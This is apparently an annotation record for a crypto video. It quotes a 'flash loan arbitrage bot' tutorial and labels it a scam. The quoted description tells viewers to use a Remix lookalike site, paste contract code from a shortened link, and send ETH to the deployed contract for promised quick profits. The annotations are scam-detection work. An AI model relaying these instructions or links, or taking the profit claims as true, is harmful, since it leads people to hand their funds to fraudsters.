description: Flash Loan Arbitrage ETH Contract Code For Ethereum Blockchain Uniswap bot flash loan attack tutorial  Remix Website: http://remixcompiler.com/ Flash Loan Contract Code: https://rebrand.ly/ETHcontract20  You need to deposit at least 0.1 for the contract to execute correctly and complete the flash loan uniswap bot.  The more you deposit, the more swaps can be performed in the flash loan arbitrage.   How it works: The contract will create a new token and then pull an ethereum flash loan to trade against the token. Within this same contract, the flash loan will be paid back and any profit remaining will be transferred to your wallet. This is called a flash loan arbitrage as it's looking for crypto arbitrage opportunities with the ETH coin.   Flash loans are a type of uncollateralized lending that have become very popular in decentralized finance (DeFi). While they've proved popular, flash loan exploits have been used to attack vulnerable DeFi protocols and get millions of dollars.  To get started, you need to have MetaMask browser extension installed. https://metamask.io or google 'metamask'  FULL INSTRUCTIONS  1. Download and setup the metamask browser wallet if you don't have it.   2. Make sure you have ETH to pay for the token creation and flash loan contract gas fees.    a. The amount of ETH you want depends on how much of a loan you pull. It has to be a minimum of 0.1 for the contract to process all the arbitrage swaps on uniswap and the ethereum blockchain. The higher the liquidity, the higher the profit.   3. Open the remix url in your browser  4. Click on contract folder on the left and click New File  5. Name the file something like flashloan.sol  6. Copy and paste the contract code into the new file  7. Select the second tab on the left  8. Choose the compiler that matches the top of the code  9. Click on compile at the bottom  10. Once it is finished, go to the third tab on the left  11. Under environment, click on injected web3. This will connect to your metamask wallet so that you can interact with the contract and implement your token on uniswap and the ethereum blockchain.   12. Click on the arrow under deploy.   13. Enter the details for your new token that will be launched on uniswap. For the loan amount choose anything from 12000 and up. This needs to be in line with whatever liquidity you decide to deposit so it's usually .1 per 1000 ethereum borrowed.   14. Click transact and then confirm the gas fees to launch the token in MetaMask.   15. Under deployed contracts, copy the new token contract code.   16. Go to your metamask or any wallet and send the liquidity to the new contract code.   17. Wait until the transaction is confirmed on the blockchain  18. Once that is finished, click the arrow and click the red Action button and confirm the gas fees to execute the flash loan attack.   19. That's it! The flash loan will be paid back automatically and any profit will be returned to your wallet in a few seconds/minutes.  Ethereum is a great blockchain network with very high volume for flash loan attacks to work well on the uniswap network.  #flashloanarbitrage, #uniswapbot

annotation.contextual_rationale: This video is scam content because it promotes a flash-loan arbitrage bot and directs viewers to connect a wallet, fund or send liquidity to a newly deployed contract, and pay gas. It claims that greater liquidity produces greater profit and that the remaining profit will return to the viewer's wallet within seconds or minutes. The frames show the wallet connection, contract deployment interface, and ETH transfer sequence, but do not establish that the code works, that the displayed balance resulted from the interaction, or that any profit was received.
annotation.fine_grained_rationale: The content presents a flash-loan arbitrage bot, links trading activity to making money, and instructs viewers to configure, deploy and fund the contract with liquidity or gas before execution.

evidence.observation: The speaker introduces an instructional flash-loan workflow on Uniswap.
evidence.quote: Today I'm going to show you how to commence a flash loan on UniSwap.

evidence.observation: The description links a minimum deposit to execution of the flash-loan bot.
evidence.quote: You need to deposit at least 0.1 for the contract to execute correctly and complete the flash loan uniswap bot.

evidence.observation: The description claims that greater deposited liquidity produces greater profit.
evidence.quote: The higher the liquidity, the higher the profit.

evidence.observation: The description presents a claimed rapid return of profit to the viewer's wallet.
evidence.quote: any profit will be returned to your wallet in a few seconds/minutes.

evidence.observation: The instructions direct viewers to send liquidity to the newly created contract address.
evidence.quote: Go to your metamask or any wallet and send the liquidity to the new contract code.

evidence.observation: The speaker instructs viewers to fund the contract with gas money before running it.
evidence.quote: You're gonna have to send gas money to run this contract.

evidence.observation: The speaker links repeated Uniswap trading activity to making money through arbitrage.
evidence.quote: It's going to do a lot of different transactions on Uniswap, trading back and forth and that's where the arbitrage comes in you make money from.

evidence.observation: The instructions direct viewers to connect a MetaMask wallet for contract interaction.
evidence.quote: This will connect to your metamask wallet so that you can interact with the contract and implement your token on uniswap and the ethereum blockchain.

evidence.observation: A MetaMask connection prompt is visible beside Remix, requesting permission to see the address, account balance and activity and to suggest transactions for approval.
The Remix deployment panel visibly contains token-name, token-symbol and loan-amount fields together with a Transact control.
A MetaMask send form visibly prepares an ETH transfer showing an amount of 0.1 ETH.
A deployed-contract interface is visible in Remix with callable controls including action, creator, tokenName, tokenSymbol and tokenTransfer.
MetaMask visibly displays an account balance of 4.2911 ETH and activity entries including Action and Send; the frame does not establish that the displayed balance resulted from the contract.
The description instructs viewers to execute an action and confirm gas fees, using the phrase flash loan attack.
evidence.quote: click the red Action button and confirm the gas fees to execute the flash loan attack.

evidence.observation: The description directs viewers to an external website and a separate contract-code link for the flash-loan workflow.
evidence.quote: Remix Website: http://remixcompiler.com/ Flash Loan Contract Code: https://rebrand.ly/ETHcontract20
